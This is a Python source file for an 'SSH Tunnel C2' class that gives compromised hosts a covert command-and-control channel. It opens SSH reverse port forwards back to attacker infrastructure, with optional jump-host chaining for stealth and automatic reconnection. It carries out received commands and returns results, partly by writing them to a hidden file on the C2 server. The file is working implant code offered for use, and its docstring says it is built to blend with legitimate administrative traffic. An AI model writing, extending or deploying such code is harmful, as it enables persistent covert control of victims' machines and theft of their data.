"""SSH Tunnel C2 — Covert command and control over SSH reverse tunnels.

Creates encrypted SSH reverse port forwards from compromised hosts back to
C2 infrastructure. Blends with legitimate SSH administrative traffic.

Techniques:
  - Reverse port forwarding (remote → local)
  - SSH key-based auth with per-session keys
  - Jump host chaining for stealth
  - Connection keepalive with fallback intervals
"""

import json
import os
import random
import select
import socket
import string
import sys
import threading
import time
from typing import Any, Callable, Dict, List, Optional, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


class SSHTunnelC2:
    """C2 channel over SSH reverse tunnels.

    Establishes SSH connections from the target to a C2 SSH server,
    creating reverse port forwards that tunnel command/response traffic.
    """

    def __init__(
        self,
        c2_host: str = "127.0.0.1",
        c2_ssh_port: int = 2222,
        c2_tunnel_port: int = 8888,
        username: str = "tunnel",
        password: Optional[str] = None,
        key_path: Optional[str] = None,
        jump_hosts: Optional[List[str]] = None,
        keepalive_interval: int = 30,
        reconnect_delay: int = 10,
        max_retries: int = 10,
        target_identifier: Optional[str] = None,
    ):
        self.c2_host = c2_host
        self.c2_ssh_port = c2_ssh_port
        self.c2_tunnel_port = c2_tunnel_port
        self.username = username
        self.password = password or os.getenv("SSH_TUNNEL_PASSWORD", "")
        self.key_path = key_path
        self.jump_hosts = jump_hosts or []
        self.keepalive_interval = keepalive_interval
        self.reconnect_delay = reconnect_delay
        self.max_retries = max_retries
        self.target_id = target_identifier or f"tunnel_{os.urandom(4).hex()}"

        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._client = None
        self._tunnel_thread: Optional[threading.Thread] = None
        self._connected = False
        self._command_handler: Optional[Callable] = None
        self._retries = 0
        self._local_port = 0
        self._transport = None

    def start(self, command_handler: Optional[Callable] = None) -> bool:
        self._command_handler = command_handler
        self._running = True

        self._thread = threading.Thread(target=self._connect_loop, daemon=True)
        self._thread.start()

        logger.info(
            f"SSH tunnel C2 starting: {self.username}@{self.c2_host}:{self.c2_ssh_port} "
            f"-> :{self.c2_tunnel_port}"
        )
        return True

    def stop(self):
        self._running = False
        self._disconnect()
        logger.info("SSH tunnel C2 stopped")

    def send_result(self, data: Dict) -> bool:
        """Send result data through the tunnel"""
        if not self._connected or not self._transport:
            return False
        try:
            payload = json.dumps(data).encode() + b"\n"
            channel = self._transport.open_session()
            channel.exec_command(
                f"echo '{payload.decode().strip()}' >> /tmp/.c2_in_{self.target_id}"
            )
            channel.close()
            return True
        except Exception as e:
            logger.debug(f"SSH tunnel send failed: {e}")
            return False

    def _connect_loop(self):
        while self._running:
            try:
                if not self._connected:
                    self._connect()
                if self._connected:
                    self._handle_tunnel()
            except Exception as e:
                logger.debug(f"Tunnel loop error: {e}")
                self._disconnect()
            if not self._running:
                break
            time.sleep(self.reconnect_delay)

    def _connect(self) -> bool:
        try:
            import paramiko

            if self._retries >= self.max_retries:
                logger.warning("SSH tunnel max retries reached")
                self._running = False
                return False

            proxy = None
            if self.jump_hosts:
                jump = self.jump_hosts[0]
                proxy = paramiko.ProxyCommand(f"ssh -W {self.c2_host}:{self.c2_ssh_port} {jump}")

            self._client = paramiko.SSHClient()
            self._client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self._client.load_system_host_keys()

            connect_args = {
                "hostname": self.c2_host,
                "port": self.c2_ssh_port,
                "username": self.username,
                "timeout": 15,
                "compress": True,
            }

            if self.key_path and os.path.isfile(self.key_path):
                key = paramiko.RSAKey.from_private_key_file(self.key_path)
                connect_args["pkey"] = key
            elif self.password:
                connect_args["password"] = self.password
            else:
                connect_args["password"] = os.getenv("SSH_TUNNEL_PASSWORD", "")

            if proxy:
                connect_args["sock"] = proxy

            self._client.connect(**connect_args)
            self._transport = self._client.get_transport()

            if self._transport:
                self._transport.set_keepalive(self.keepalive_interval)
                self._transport.request_port_forward("127.0.0.1", self.c2_tunnel_port)

            self._connected = True
            self._retries = 0
            logger.success(
                f"SSH tunnel established: :{self.c2_tunnel_port} "
                f"<- {self.c2_host}:{self.c2_ssh_port}"
            )
            return True

        except ImportError:
            logger.warning("paramiko not available for SSH tunnel")
            self._running = False
            return False
        except Exception as e:
            self._retries += 1
            logger.debug(f"SSH tunnel connect failed ({self._retries}/{self.max_retries}): {e}")
            self._disconnect()
            return False

    def _handle_tunnel(self):
        if not self._transport:
            return
        try:
            while self._running and self._connected:
                channel = self._transport.accept(5)
                if channel is None:
                    continue
                self._tunnel_thread = threading.Thread(
                    target=self._handle_channel,
                    args=(channel,),
                    daemon=True,
                )
                self._tunnel_thread.start()
        except Exception as e:
            logger.debug(f"Tunnel handler error: {e}")
            self._disconnect()

    def _handle_channel(self, channel):
        try:
            data = b""
            while self._running:
                if channel.recv_ready():
                    chunk = channel.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    try:
                        msg = json.loads(data.decode().strip())
                        if self._command_handler:
                            result = self._command_handler(
                                msg.get("command", ""), msg.get("payload", {})
                            )
                            response = json.dumps(result).encode() + b"\n"
                            channel.send(response)
                        data = b""
                    except (json.JSONDecodeError, UnicodeDecodeError):
                        continue
                else:
                    time.sleep(0.1)
        except Exception as e:
            logger.debug(f"Channel handler error: {e}")
        finally:
            try:
                channel.close()
            except Exception:
                pass

    def _disconnect(self):
        self._connected = False
        try:
            if self._client:
                self._client.close()
        except Exception:
            pass
        self._client = None
        self._transport = None

    @property
    def connected(self) -> bool:
        return self._connected

    def get_stats(self) -> Dict:
        return {
            "connected": self._connected,
            "running": self._running,
            "target_id": self.target_id,
            "c2_host": self.c2_host,
            "c2_ssh_port": self.c2_ssh_port,
            "c2_tunnel_port": self.c2_tunnel_port,
            "retries": self._retries,
            "max_retries": self.max_retries,
        }
